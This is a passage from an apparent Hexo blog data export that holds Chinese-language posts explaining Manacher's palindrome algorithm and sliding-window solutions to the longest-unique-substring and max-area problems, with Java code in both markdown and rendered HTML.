//继续进行拓展\n            //是否到达左边界，是否到达右边界，是否对称\n            while(i-p[i] >=0\n                 && i+p[i]<= ns.length()-1\n                 && ns.charAt(i+p[i]) == ns.charAt(i-p[i])){\n                p[i]+=1;\n            }\n            //发现更大的子串，进行调整，如果相等，不调整，取第一个\n            if(p[i]> mxr-pos){\n                pos = i;\n                mxr = p[i] + i;\n            }\n        }\n        //因为p[pos]的长度包括了pos自己,所以回文串范围为(pos-p[pos]+1, pos+p[pos]-1)\n        //因为substring取值为[a,b)，所以范围为(pos-p[pos]+1, pos+p[pos])\n         return ns.substring(pos-p[pos]+1, pos+p[pos]).replace(\"#\",\"\");\n    }\n}\n```\n","source":"_posts/algorithm/manacher/manacher.md","raw":"---\ntitle: 马拉车算法\ndate: 2019-5-27 15:25:33\ntags: [algorithm]\n---\n\n### manacher算法\n处理回文字符串:<br>\n一搬思路为中心拓展:<br>\n```\n//预处理，得到不分奇偶的新串 #a#b#a#c#\nfor(int i=0; i<len; i++){\n  for (int j = 0; (i-j >= 0) && (i+j < len); j++){\n\t\t  //在左右j距离拓展匹配\n      if (s[i - j] != s[i + j])\n\t\t\t\tbreak;\n      //纪录最大距离\n\t}\n  //更新最大子串\n\n}\n```\nManacher算法，将时间压缩到线性，时间复杂度/空间复杂度都是O(n).\n\n\n##### 1.新串\n无论字符串原先为奇数还是偶数长度，通过添加特殊字符都能使之变为奇数，减少判断条件。<br>\n例:\n- aba >> #a#b#a#\n- abab >> #a#b#a#b#\n\n##### 2.循环得到p[i]\n首先定义几个变量: <br>\n- p[i] 存储对应位置(i)的最大子串的长度,左或右半边(包括了自己本身)\n- pos 当前最大子串的中心位置\n- mxr 当前最大子串的右边界\n- mxl 当前最大字串的左边界\n\n![manacher](./manacher01.png)\nmanacher算法的关键: <br>\n//p[i] = mxr > i ? Math.min(p[2*pos -i], mxr-i):1;<br>\n<strong>p[i] = mxr > i ? Math.min(p[2pos -i], mxr-i):0;</strong>  \n\n如图，i和j关于pos对称，pos-j = i-pos， 即 j = 2*pos-i<br>\n当要计算第i位的p[i]时，i位之前的p[i]都为已知：<br>\n此时:<br>\n###### (1).若i在mxr右边\n将p[i]置为1(因为mxr的位置必定为#,它的下一位肯定>=1,但是如果mxr==i,则为p[i]肯定为0，所以这里置为0)，进行拓展匹配。<br>\n###### (2).若i在当前最大字串范围内：<br>\n<strong>mxr-i 与 p[j] 的关系，判断以 j 为中心的子串是否完全在以pos为中心的子串内.<br></strong>\n- 若 mxr - i > p[j]\\(例p[10]，p[11],p[12]), 此时可知已j为中心的回文串，包含在以pos为中心的回文串左边部分内，由左右对称可知，以i为中心的回文串p[i] = p[j]<br>\n- 若 mxr -i <= p[j]\\(例p[13]), 此时mxr-i和j-mxl部分是一样的，可以保证如果原理这部分关于j对称的话(又因为mxr-i<=p[j],所以这部分肯定对称，j-mxl是j的字串的一部分)，至少这部分关于i肯定对称，所以p[i]至少有mxr-i的长度,再向右进行拓展匹配<br>\n\n取p[j]和mxr-i中较小的值，再进行拓展匹配<br>\n\n这样循环一次就得到了所有p[i]的值。\n\n##### 3.具体代码\n```\nclass Solution {\n    public String longestPalindrome(String s) {\n        //生成新串\n        StringBuffer sb = new StringBuffer();\n        for(int i=0; i<s.length()*2+1; i++){\n            if(i%2 == 0){\n                sb.append(\"#\");\n            }else{\n                sb.append(s.charAt(i/2));\n            }\n        }\n        String ns = sb.toString();\n        //处理\n        int[] p = new int[ns.length()];\n        p[0] = 0;\n        int pos = 0, mxr = 0;\n        for(int i=0; i<ns.length(); i++){\n            p[i] = mxr>i ? Math.min(p[pos*2-i],mxr-i):0;\n            //继续进行拓展\n            //是否到达左边界，是否到达右边界，是否对称\n            while(i-p[i] >=0\n                 && i+p[i]<= ns.length()-1\n                 && ns.charAt(i+p[i]) == ns.charAt(i-p[i])){\n                p[i]+=1;\n            }\n            //发现更大的子串，进行调整，如果相等，不调整，取第一个\n            if(p[i]> mxr-pos){\n                pos = i;\n                mxr = p[i] + i;\n            }\n        }\n        //因为p[pos]的长度包括了pos自己,所以回文串范围为(pos-p[pos]+1, pos+p[pos]-1)\n        //因为substring取值为[a,b)，所以范围为(pos-p[pos]+1, pos+p[pos])\n         return ns.substring(pos-p[pos]+1, pos+p[pos]).replace(\"#\",\"\");\n    }\n}\n```\n","slug":"algorithm/manacher/manacher","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321l5003k6dcpfgp1du9r","content":"<h3 id=\"manacher算法\"><a href=\"#manacher算法\" class=\"headerlink\" title=\"manacher算法\"></a>manacher算法</h3><p>处理回文字符串:<br><br>一搬思路为中心拓展:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//预处理，得到不分奇偶的新串 #a#b#a#c#</span><br><span class=\"line\">for(int i=0; i&lt;len; i++)&#123;</span><br><span class=\"line\">  for (int j = 0; (i-j &gt;= 0) &amp;&amp; (i+j &lt; len); j++)&#123;</span><br><span class=\"line\">\t\t  //在左右j距离拓展匹配</span><br><span class=\"line\">      if (s[i - j] != s[i + j])</span><br><span class=\"line\">\t\t\t\tbreak;</span><br><span class=\"line\">      //纪录最大距离</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">  //更新最大子串</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>Manacher算法，将时间压缩到线性，时间复杂度/空间复杂度都是O(n).</p>\n<h5 id=\"1-新串\"><a href=\"#1-新串\" class=\"headerlink\" title=\"1.新串\"></a>1.新串</h5><p>无论字符串原先为奇数还是偶数长度，通过添加特殊字符都能使之变为奇数，减少判断条件。<br><br>例:</p>\n<ul>\n<li>aba &gt;&gt; #a#b#a#</li>\n<li>abab &gt;&gt; #a#b#a#b#</li>\n</ul>\n<h5 id=\"2-循环得到p-i\"><a href=\"#2-循环得到p-i\" class=\"headerlink\" title=\"2.循环得到p[i]\"></a>2.循环得到p[i]</h5><p>首先定义几个变量: <br></p>\n<ul>\n<li>p[i] 存储对应位置(i)的最大子串的长度,左或右半边(包括了自己本身)</li>\n<li>pos 当前最大子串的中心位置</li>\n<li>mxr 当前最大子串的右边界</li>\n<li>mxl 当前最大字串的左边界</li>\n</ul>\n<p><img src=\"./manacher01.png\" alt=\"manacher\"><br>manacher算法的关键: <br><br>//p[i] = mxr &gt; i ? Math.min(p[2*pos -i], mxr-i):1;<br><br><strong>p[i] = mxr &gt; i ? Math.min(p[2pos -i], mxr-i):0;</strong>  </p>\n<p>如图，i和j关于pos对称，pos-j = i-pos， 即 j = 2*pos-i<br><br>当要计算第i位的p[i]时，i位之前的p[i]都为已知：<br><br>此时:<br></p>\n<h6 id=\"1-若i在mxr右边\"><a href=\"#1-若i在mxr右边\" class=\"headerlink\" title=\"(1).若i在mxr右边\"></a>(1).若i在mxr右边</h6><p>将p[i]置为1(因为mxr的位置必定为#,它的下一位肯定&gt;=1,但是如果mxr==i,则为p[i]肯定为0，所以这里置为0)，进行拓展匹配。<br></p>\n<h6 id=\"2-若i在当前最大字串范围内：\"><a href=\"#2-若i在当前最大字串范围内：\" class=\"headerlink\" title=\"(2).若i在当前最大字串范围内：\"></a>(2).若i在当前最大字串范围内：<br></h6><p><strong>mxr-i 与 p[j] 的关系，判断以 j 为中心的子串是否完全在以pos为中心的子串内.<br></strong></p>\n<ul>\n<li>若 mxr - i &gt; p[j](例p[10]，p[11],p[12]), 此时可知已j为中心的回文串，包含在以pos为中心的回文串左边部分内，由左右对称可知，以i为中心的回文串p[i] = p[j]<br></li>\n<li>若 mxr -i &lt;= p[j](例p[13]), 此时mxr-i和j-mxl部分是一样的，可以保证如果原理这部分关于j对称的话(又因为mxr-i&lt;=p[j],所以这部分肯定对称，j-mxl是j的字串的一部分)，至少这部分关于i肯定对称，所以p[i]至少有mxr-i的长度,再向右进行拓展匹配<br></li>\n</ul>\n<p>取p[j]和mxr-i中较小的值，再进行拓展匹配<br></p>\n<p>这样循环一次就得到了所有p[i]的值。</p>\n<h5 id=\"3-具体代码\"><a href=\"#3-具体代码\" class=\"headerlink\" title=\"3.具体代码\"></a>3.具体代码</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solution &#123;</span><br><span class=\"line\">    public String longestPalindrome(String s) &#123;</span><br><span class=\"line\">        //生成新串</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        for(int i=0; i&lt;s.length()*2+1; i++)&#123;</span><br><span class=\"line\">            if(i%2 == 0)&#123;</span><br><span class=\"line\">                sb.append(&quot;#&quot;);</span><br><span class=\"line\">            &#125;else&#123;</span><br><span class=\"line\">                sb.append(s.charAt(i/2));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        String ns = sb.toString();</span><br><span class=\"line\">        //处理</span><br><span class=\"line\">        int[] p = new int[ns.length()];</span><br><span class=\"line\">        p[0] = 0;</span><br><span class=\"line\">        int pos = 0, mxr = 0;</span><br><span class=\"line\">        for(int i=0; i&lt;ns.length(); i++)&#123;</span><br><span class=\"line\">            p[i] = mxr&gt;i ? Math.min(p[pos*2-i],mxr-i):0;</span><br><span class=\"line\">            //继续进行拓展</span><br><span class=\"line\">            //是否到达左边界，是否到达右边界，是否对称</span><br><span class=\"line\">            while(i-p[i] &gt;=0</span><br><span class=\"line\">                 &amp;&amp; i+p[i]&lt;= ns.length()-1</span><br><span class=\"line\">                 &amp;&amp; ns.charAt(i+p[i]) == ns.charAt(i-p[i]))&#123;</span><br><span class=\"line\">                p[i]+=1;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            //发现更大的子串，进行调整，如果相等，不调整，取第一个</span><br><span class=\"line\">            if(p[i]&gt; mxr-pos)&#123;</span><br><span class=\"line\">                pos = i;</span><br><span class=\"line\">                mxr = p[i] + i;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //因为p[pos]的长度包括了pos自己,所以回文串范围为(pos-p[pos]+1, pos+p[pos]-1)</span><br><span class=\"line\">        //因为substring取值为[a,b)，所以范围为(pos-p[pos]+1, pos+p[pos])</span><br><span class=\"line\">         return ns.substring(pos-p[pos]+1, pos+p[pos]).replace(&quot;#&quot;,&quot;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"manacher算法\"><a href=\"#manacher算法\" class=\"headerlink\" title=\"manacher算法\"></a>manacher算法</h3><p>处理回文字符串:<br><br>一搬思路为中心拓展:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//预处理，得到不分奇偶的新串 #a#b#a#c#</span><br><span class=\"line\">for(int i=0; i&lt;len; i++)&#123;</span><br><span class=\"line\">  for (int j = 0; (i-j &gt;= 0) &amp;&amp; (i+j &lt; len); j++)&#123;</span><br><span class=\"line\">\t\t  //在左右j距离拓展匹配</span><br><span class=\"line\">      if (s[i - j] != s[i + j])</span><br><span class=\"line\">\t\t\t\tbreak;</span><br><span class=\"line\">      //纪录最大距离</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">  //更新最大子串</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>Manacher算法，将时间压缩到线性，时间复杂度/空间复杂度都是O(n).</p>\n<h5 id=\"1-新串\"><a href=\"#1-新串\" class=\"headerlink\" title=\"1.新串\"></a>1.新串</h5><p>无论字符串原先为奇数还是偶数长度，通过添加特殊字符都能使之变为奇数，减少判断条件。<br><br>例:</p>\n<ul>\n<li>aba &gt;&gt; #a#b#a#</li>\n<li>abab &gt;&gt; #a#b#a#b#</li>\n</ul>\n<h5 id=\"2-循环得到p-i\"><a href=\"#2-循环得到p-i\" class=\"headerlink\" title=\"2.循环得到p[i]\"></a>2.循环得到p[i]</h5><p>首先定义几个变量: <br></p>\n<ul>\n<li>p[i] 存储对应位置(i)的最大子串的长度,左或右半边(包括了自己本身)</li>\n<li>pos 当前最大子串的中心位置</li>\n<li>mxr 当前最大子串的右边界</li>\n<li>mxl 当前最大字串的左边界</li>\n</ul>\n<p><img src=\"./manacher01.png\" alt=\"manacher\"><br>manacher算法的关键: <br><br>//p[i] = mxr &gt; i ? Math.min(p[2*pos -i], mxr-i):1;<br><br><strong>p[i] = mxr &gt; i ? Math.min(p[2pos -i], mxr-i):0;</strong>  </p>\n<p>如图，i和j关于pos对称，pos-j = i-pos， 即 j = 2*pos-i<br><br>当要计算第i位的p[i]时，i位之前的p[i]都为已知：<br><br>此时:<br></p>\n<h6 id=\"1-若i在mxr右边\"><a href=\"#1-若i在mxr右边\" class=\"headerlink\" title=\"(1).若i在mxr右边\"></a>(1).若i在mxr右边</h6><p>将p[i]置为1(因为mxr的位置必定为#,它的下一位肯定&gt;=1,但是如果mxr==i,则为p[i]肯定为0，所以这里置为0)，进行拓展匹配。<br></p>\n<h6 id=\"2-若i在当前最大字串范围内：\"><a href=\"#2-若i在当前最大字串范围内：\" class=\"headerlink\" title=\"(2).若i在当前最大字串范围内：\"></a>(2).若i在当前最大字串范围内：<br></h6><p><strong>mxr-i 与 p[j] 的关系，判断以 j 为中心的子串是否完全在以pos为中心的子串内.<br></strong></p>\n<ul>\n<li>若 mxr - i &gt; p[j](例p[10]，p[11],p[12]), 此时可知已j为中心的回文串，包含在以pos为中心的回文串左边部分内，由左右对称可知，以i为中心的回文串p[i] = p[j]<br></li>\n<li>若 mxr -i &lt;= p[j](例p[13]), 此时mxr-i和j-mxl部分是一样的，可以保证如果原理这部分关于j对称的话(又因为mxr-i&lt;=p[j],所以这部分肯定对称，j-mxl是j的字串的一部分)，至少这部分关于i肯定对称，所以p[i]至少有mxr-i的长度,再向右进行拓展匹配<br></li>\n</ul>\n<p>取p[j]和mxr-i中较小的值，再进行拓展匹配<br></p>\n<p>这样循环一次就得到了所有p[i]的值。</p>\n<h5 id=\"3-具体代码\"><a href=\"#3-具体代码\" class=\"headerlink\" title=\"3.具体代码\"></a>3.具体代码</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solution &#123;</span><br><span class=\"line\">    public String longestPalindrome(String s) &#123;</span><br><span class=\"line\">        //生成新串</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        for(int i=0; i&lt;s.length()*2+1; i++)&#123;</span><br><span class=\"line\">            if(i%2 == 0)&#123;</span><br><span class=\"line\">                sb.append(&quot;#&quot;);</span><br><span class=\"line\">            &#125;else&#123;</span><br><span class=\"line\">                sb.append(s.charAt(i/2));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        String ns = sb.toString();</span><br><span class=\"line\">        //处理</span><br><span class=\"line\">        int[] p = new int[ns.length()];</span><br><span class=\"line\">        p[0] = 0;</span><br><span class=\"line\">        int pos = 0, mxr = 0;</span><br><span class=\"line\">        for(int i=0; i&lt;ns.length(); i++)&#123;</span><br><span class=\"line\">            p[i] = mxr&gt;i ? Math.min(p[pos*2-i],mxr-i):0;</span><br><span class=\"line\">            //继续进行拓展</span><br><span class=\"line\">            //是否到达左边界，是否到达右边界，是否对称</span><br><span class=\"line\">            while(i-p[i] &gt;=0</span><br><span class=\"line\">                 &amp;&amp; i+p[i]&lt;= ns.length()-1</span><br><span class=\"line\">                 &amp;&amp; ns.charAt(i+p[i]) == ns.charAt(i-p[i]))&#123;</span><br><span class=\"line\">                p[i]+=1;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            //发现更大的子串，进行调整，如果相等，不调整，取第一个</span><br><span class=\"line\">            if(p[i]&gt; mxr-pos)&#123;</span><br><span class=\"line\">                pos = i;</span><br><span class=\"line\">                mxr = p[i] + i;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //因为p[pos]的长度包括了pos自己,所以回文串范围为(pos-p[pos]+1, pos+p[pos]-1)</span><br><span class=\"line\">        //因为substring取值为[a,b)，所以范围为(pos-p[pos]+1, pos+p[pos])</span><br><span class=\"line\">         return ns.substring(pos-p[pos]+1, pos+p[pos]).replace(&quot;#&quot;,&quot;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"滑动窗口解决最长子串问题","date":"2019-05-29T18:25:33.000Z","_content":"\n#### 1.问题\n寻找一个字符串中最长不重复的字符串长度。<br>\n(1)通用做法:<br>\n```\nfor(int i=0; i<len; i++){\n    for(int j=i; j<len; j++){\n      //找到以i开头的最长不重复子串\n      if(){\n        break;\n      }\n    }\n}\n```\n(2)用滑动窗口来解决<br>\n\n#### 2.滑动窗口\n原理：<br>\n维护一个长度为right-left的窗口，通过左右边界的收缩与拓展来找到最大长度。<br>\n只需一次遍历，时间复杂度O(n).<br>\n\n#### 3.实现\n```\nclass Solution {\n    public int lengthOfLongestSubstring(String s) {\n        //滑动窗口\n        int left = 0, right = 0;\n        int max = 0;\n        Set window = new HashSet();\n        while(left<s.length() && right<s.length()){\n            if(!window.contains(s.charAt(right))){\n                window.add(s.charAt(right));\n                right++;\n                //更新最大值\n                max = Math.max(max,right-left);\n            }else{\n              //收缩左边界到没有重复为止，\n              //按照顺序收缩，例 abcb->bcb->cb\n                window.remove(s.charAt(left));\n                left++;\n            }\n\n        }\n        return max;\n    }\n}\n```\n","source":"_posts/algorithm/sildewindow/manacher.md","raw":"---\ntitle: 滑动窗口解决最长子串问题\ndate: 2019-5-29 14:25:33\ntags: [algorithm]\n---\n\n#### 1.问题\n寻找一个字符串中最长不重复的字符串长度。<br>\n(1)通用做法:<br>\n```\nfor(int i=0; i<len; i++){\n    for(int j=i; j<len; j++){\n      //找到以i开头的最长不重复子串\n      if(){\n        break;\n      }\n    }\n}\n```\n(2)用滑动窗口来解决<br>\n\n#### 2.滑动窗口\n原理：<br>\n维护一个长度为right-left的窗口，通过左右边界的收缩与拓展来找到最大长度。<br>\n只需一次遍历，时间复杂度O(n).<br>\n\n#### 3.实现\n```\nclass Solution {\n    public int lengthOfLongestSubstring(String s) {\n        //滑动窗口\n        int left = 0, right = 0;\n        int max = 0;\n        Set window = new HashSet();\n        while(left<s.length() && right<s.length()){\n            if(!window.contains(s.charAt(right))){\n                window.add(s.charAt(right));\n                right++;\n                //更新最大值\n                max = Math.max(max,right-left);\n            }else{\n              //收缩左边界到没有重复为止，\n              //按照顺序收缩，例 abcb->bcb->cb\n                window.remove(s.charAt(left));\n                left++;\n            }\n\n        }\n        return max;\n    }\n}\n```\n","slug":"algorithm/sildewindow/manacher","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321l6003m6dcppuefcsp6","content":"<h4 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h4><p>寻找一个字符串中最长不重复的字符串长度。<br><br>(1)通用做法:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for(int i=0; i&lt;len; i++)&#123;</span><br><span class=\"line\">    for(int j=i; j&lt;len; j++)&#123;</span><br><span class=\"line\">      //找到以i开头的最长不重复子串</span><br><span class=\"line\">      if()&#123;</span><br><span class=\"line\">        break;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>(2)用滑动窗口来解决<br></p>\n<h4 id=\"2-滑动窗口\"><a href=\"#2-滑动窗口\" class=\"headerlink\" title=\"2.滑动窗口\"></a>2.滑动窗口</h4><p>原理：<br><br>维护一个长度为right-left的窗口，通过左右边界的收缩与拓展来找到最大长度。<br><br>只需一次遍历，时间复杂度O(n).<br></p>\n<h4 id=\"3-实现\"><a href=\"#3-实现\" class=\"headerlink\" title=\"3.实现\"></a>3.实现</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solution &#123;</span><br><span class=\"line\">    public int lengthOfLongestSubstring(String s) &#123;</span><br><span class=\"line\">        //滑动窗口</span><br><span class=\"line\">        int left = 0, right = 0;</span><br><span class=\"line\">        int max = 0;</span><br><span class=\"line\">        Set window = new HashSet();</span><br><span class=\"line\">        while(left&lt;s.length() &amp;&amp; right&lt;s.length())&#123;</span><br><span class=\"line\">            if(!window.contains(s.charAt(right)))&#123;</span><br><span class=\"line\">                window.add(s.charAt(right));</span><br><span class=\"line\">                right++;</span><br><span class=\"line\">                //更新最大值</span><br><span class=\"line\">                max = Math.max(max,right-left);</span><br><span class=\"line\">            &#125;else&#123;</span><br><span class=\"line\">              //收缩左边界到没有重复为止，</span><br><span class=\"line\">              //按照顺序收缩，例 abcb-&gt;bcb-&gt;cb</span><br><span class=\"line\">                window.remove(s.charAt(left));</span><br><span class=\"line\">                left++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return max;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h4><p>寻找一个字符串中最长不重复的字符串长度。<br><br>(1)通用做法:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for(int i=0; i&lt;len; i++)&#123;</span><br><span class=\"line\">    for(int j=i; j&lt;len; j++)&#123;</span><br><span class=\"line\">      //找到以i开头的最长不重复子串</span><br><span class=\"line\">      if()&#123;</span><br><span class=\"line\">        break;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>(2)用滑动窗口来解决<br></p>\n<h4 id=\"2-滑动窗口\"><a href=\"#2-滑动窗口\" class=\"headerlink\" title=\"2.滑动窗口\"></a>2.滑动窗口</h4><p>原理：<br><br>维护一个长度为right-left的窗口，通过左右边界的收缩与拓展来找到最大长度。<br><br>只需一次遍历，时间复杂度O(n).<br></p>\n<h4 id=\"3-实现\"><a href=\"#3-实现\" class=\"headerlink\" title=\"3.实现\"></a>3.实现</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solution &#123;</span><br><span class=\"line\">    public int lengthOfLongestSubstring(String s) &#123;</span><br><span class=\"line\">        //滑动窗口</span><br><span class=\"line\">        int left = 0, right = 0;</span><br><span class=\"line\">        int max = 0;</span><br><span class=\"line\">        Set window = new HashSet();</span><br><span class=\"line\">        while(left&lt;s.length() &amp;&amp; right&lt;s.length())&#123;</span><br><span class=\"line\">            if(!window.contains(s.charAt(right)))&#123;</span><br><span class=\"line\">                window.add(s.charAt(right));</span><br><span class=\"line\">                right++;</span><br><span class=\"line\">                //更新最大值</span><br><span class=\"line\">                max = Math.max(max,right-left);</span><br><span class=\"line\">            &#125;else&#123;</span><br><span class=\"line\">              //收缩左边界到没有重复为止，</span><br><span class=\"line\">              //按照顺序收缩，例 abcb-&gt;bcb-&gt;cb</span><br><span class=\"line\">                window.remove(s.charAt(left));</span><br><span class=\"line\">                left++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return max;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"求最大面积","date":"2019-06-06T19:55:13.000Z","_content":"\n### 1.问题\n![contains](https://s3-lc-upload.s3.amazonaws.com/uploads/2018/07/17/question_11.jpg)\n\n假设有一个容器，给定一个输入数组height,数组长度不小于2，height[i]代表第i位的木板高度，找到这个数组内的最大面积（容器最大能装水的方案）.<br>\n\n###  2.分析\n利用滑动窗口，先将整个视为一个窗口，通过不短缩小窗口边界，记录其中的最大值<br>\n\n因为装水的深度取决于两个木板中较矮的那个。所以，窗口边界左移还是右移，看木板的高度。<br>\n- 若left 高于 right, 则右边界收缩\n- 若left 低于 right, 则左边界收缩\n- 记录过程中的 Max(area)\n\n### 3.代码实现\n```\nclass Solution {\n    public int maxArea(int[] height) {\n        int right = height.length - 1;\n        int left = 0;\n        int max = 0;\n        while(left < right){\n            int s = Math.min(height[left], height[right]) * (right-left);\n            max = Math.max(max,s);\n            if(height[left] > height[right]){\n                right--;\n            }else{\n                left++;\n            }\n        }\n        return max;\n    }\n}\n```\n","source":"_posts/algorithm/sildewindow/最大面积.md","raw":"---\ntitle: 求最大面积\ndate: 2019-6-06 15:55:13\ntags: [algorithm]\n---\n\n### 1.问题\n![contains](https://s3-lc-upload.s3.amazonaws.com/uploads/2018/07/17/question_11.jpg)\n\n假设有一个容器，给定一个输入数组height,数组长度不小于2，height[i]代表第i位的木板高度，找到这个数组内的最大面积（容器最大能装水的方案）.<br>\n\n###  